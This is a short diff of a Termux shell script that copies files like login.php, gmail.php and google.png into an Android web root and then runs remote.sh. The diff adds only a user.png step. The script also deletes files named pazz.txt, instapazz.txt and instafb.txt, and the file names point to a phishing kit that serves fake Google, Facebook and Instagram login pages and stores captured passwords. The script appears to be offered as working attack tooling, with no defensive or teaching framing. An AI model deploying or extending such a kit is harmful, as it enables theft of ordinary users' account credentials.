@@ -13,6 +13,7 @@ rm /sdcard/htdocs/google.png
 rm /sdcard/htdocs/gmail.php
 rm /sdcard/htdocs/facebook.ttf
 rm /sdcard/htdocs/mobile.png
+rm /sdcard/htdocs/user.png
 rm /sdcard/htdocs/pazz.txt
 rm /sdcard/htdocs/instapazz.txt
 rm /sdcard/htdocs/instafb.txt
@@ -26,5 +27,6 @@ cp login.php /sdcard/htdocs
 cp google.png /sdcard/htdocs
 cp gmail.php /sdcard/htdocs
 cp action.php /sdcard/htdocs
+cp user.png /sdcard/htdocs
 cd /data/data/com.termux/files/home/www.philiphacker.in/
 sh remote.sh
